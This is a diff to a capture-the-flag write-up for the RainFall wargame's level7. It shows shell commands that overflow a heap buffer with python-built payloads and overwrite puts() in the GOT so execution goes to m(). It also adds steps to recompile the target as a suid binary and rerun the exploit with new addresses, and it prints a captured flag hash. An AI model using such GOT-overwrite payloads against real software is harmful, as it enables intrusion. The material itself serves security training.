@@ -115,9 +115,30 @@ Let's visualize that.
 ```
 Let's try it out!
 ```
-level7@RainFall:~$ ./level7 $(python -c 'print "a"*20+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+level7@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1611061949
 ```
+
+## Recreate Exploited Binary
+
+As user level8, in /tmp, create and compile level7_source.c.
+```
+level8@RainFall:~$ cd /tmp
+level8@RainFall:/tmp$ gcc level7_source.c -o level7_source
+```
+Edit permissions including suid, then move the binary to home directory.
+```
+level8@RainFall:/tmp$ chmod u+s level7_source
+level8@RainFall:/tmp$ chmod +wx ~; mv level7_source ~
+```
+Exit back to user level7, then run the binary. <br/>
+Notes: 
+- Our new address for ```m()``` is located at 0x08048514 (but we still print the address in little endian).
+- Our new address for ```puts()``` is located at 0x8048420 => 0x804a014 (in the GOT)
+```
+level8@RainFall:/tmp$ exit
+exit
+level7@RainFall:~$ ./level7_source "python -c 'print "a" * 20 + "\x14\x85\x04\x08"'" "python -c 'print "\x14\xa0\x04\x08"'"
 
 
